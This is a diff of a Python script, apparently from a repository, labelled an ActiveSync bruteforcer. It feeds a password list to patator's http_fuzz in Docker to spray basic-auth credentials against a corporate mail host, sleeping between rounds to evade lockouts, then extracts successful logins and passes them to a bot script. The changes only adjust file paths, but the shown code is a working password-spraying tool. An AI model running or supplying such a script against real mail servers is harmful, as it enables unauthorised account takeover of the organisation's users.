@@ -8,7 +8,7 @@ parser = argparse.ArgumentParser(description='ActiveSync Bruteforcer')
 parser.add_argument('-p', '--passwordsfile', help='File of passwords')
 args = parser.parse_args()
 
-os.system('rm -f /error.txt')
+os.system('rm -f error.txt')
 data = []
 with open(args.passwordsfile, 'r') as password:
 	data = password.read().splitlines()
@@ -28,12 +28,12 @@ for i in data:
 	os.system("sudo docker run -t --add-host mail.site.com:10.10.10.10 --rm -v /userpass:/mnt patator http_fuzz auth_type=basic url='' user_pass='domain\FILE1:FILE0' 0=/mnt/pass.txt 1=/mnt/user.txt -x ignore:code=401 >> /result/%s.txt" % (curent_date))
 	time.sleep(900)
 
-if os.path.isfile('/error.txt'):
+if os.path.isfile('error.txt'):
 	os.system('python3 bot.py --f error.txt')
 os.system("cat /result/%s.txt | grep -e '500' -e 'xxx' | cut -d: -f5 | awk -F\| '{print $1}' | uniq -u |sort | awk '{$1=$1};1' >> /res.tmp" % (curent_date))
 
 
-if os.stat("/res.tmp").st_size == 0:
+if os.stat("res.tmp").st_size == 0:
     print('no weak password')
 else:
     os.system("python3 bot.py --f res.tmp")
